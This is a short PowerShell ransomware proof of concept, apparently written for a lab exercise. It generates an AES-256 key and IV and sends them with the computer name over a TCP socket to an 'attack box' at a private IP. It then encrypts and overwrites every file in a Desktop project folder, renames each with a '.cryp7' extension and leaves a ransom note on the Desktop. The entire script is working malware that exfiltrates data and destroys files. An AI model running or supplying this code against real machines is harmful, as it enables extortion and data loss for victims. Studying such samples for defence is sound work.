# --- 03.CRYP7L4D Targeted Encryption PoC ---

$TargetFolder = "$home\Desktop\PROJECT.5527"
$AttackBoxIP = "192.168.1.16"
$Port = "4434" # Use a different port for keys

if (Test-Path $TargetFolder) {
    # 1. Generate AES Key and IV
    $Aes = [System.Security.Cryptography.Aes]::Create()
    $Aes.KeySize = 256
    $Aes.GenerateKey()
    $Aes.GenerateIV()
    
    $KeyString = [Convert]::ToBase64String($Aes.Key)
    $IVString = [Convert]::ToBase64String($Aes.IV)

    # 2. Exfiltrate Key to Attack Box
    try {
        $client = New-Object System.Net.Sockets.TcpClient($AttackBoxIP, $Port)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.WriteLine("KEY_RECOVERY|$($env:COMPUTERNAME)|$KeyString|$IVString")
        $writer.Flush(); $client.Close()
    } catch { 
        # In a real scenario, malware might wait for successful exfiltration before encrypting
    }

    # 3. Encrypt Files
    $Files = Get-ChildItem $TargetFolder -File
    foreach ($File in $Files) {
        $Bytes = [System.IO.File]::ReadAllBytes($File.FullName)
        $Encryptor = $Aes.CreateEncryptor()
        $EncryptedBytes = $Encryptor.TransformFinalBlock($Bytes, 0, $Bytes.Length)
        
        # Overwrite file and rename
        [System.IO.File]::WriteAllBytes($File.FullName, $EncryptedBytes)
        Rename-Item $File.FullName -NewName ($File.Name + ".cryp7")
    }

    # 4. Leave the Ransom Note
    $Note = "We might have encrypted the files in the $TargetFolder . Most Malicious Indeed! Please await the Decryption instructions."
    $Note | Out-File "$home\Desktop\READ_ME.txt"
}
